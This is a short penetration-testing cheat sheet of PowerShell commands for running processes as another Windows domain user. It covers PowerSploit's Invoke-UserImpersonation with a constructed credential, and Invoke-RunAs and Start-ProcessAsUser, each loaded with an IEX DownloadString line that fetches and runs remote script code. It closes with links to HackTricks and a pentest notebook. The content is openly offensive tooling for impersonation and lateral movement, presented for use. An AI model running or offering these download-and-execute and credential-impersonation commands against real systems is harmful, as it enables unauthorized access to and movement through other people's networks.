# Scripts

## PowerSploit

```powershell
$username = "<DOMAIN>\<username>"
$password = "<password>"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
Invoke-UserImpersonation -Credential $credential
# To revert back to original privileged access
Invoke-RevertToSelf
```

## Invoke-RunAs

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/management/Invoke-RunAs.ps1')

PS C:\> Invoke-RunAs -UserName "<username>" -Password "<password>" -Domain "<DOMAIN>" -Cmd <command> [-Arguments "<arguments>"]
```

## Start-ProcessAsUser

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Start-ProcessAsUser.ps1')

PS C:\> Start-ProcessAsUser -Domain <domain>.<tld> "<username>" -Password "<password>" -Domain "<DOMAIN>" -Cmd "<command> [arguments]" -NetOnly
```

---
## References

- [Hacktricks: PowerView](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

- [Pentester's Promiscous Notebook: RunAs](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas)